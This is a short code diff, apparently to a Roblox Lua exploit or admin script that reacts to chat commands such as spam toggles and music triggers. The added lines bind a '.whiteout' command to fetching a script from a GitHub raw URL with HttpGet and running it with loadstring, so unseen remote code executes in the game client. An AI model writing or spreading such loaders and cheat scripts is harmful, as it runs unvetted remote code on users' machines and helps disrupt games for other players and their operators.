@@ -50,6 +50,9 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
        spam = true
        print("Spam is on.")
     end
+    if command == ".whiteout" then
+       loadstring(game:HttpGet('https://raw.githubusercontent.com/DIZZYTHELEGEND/Zmod/main/Whiteout'))()
+    end
     if command == ".gmusic1" then
        Chat("music 0000000000000000000006529070845")
     end
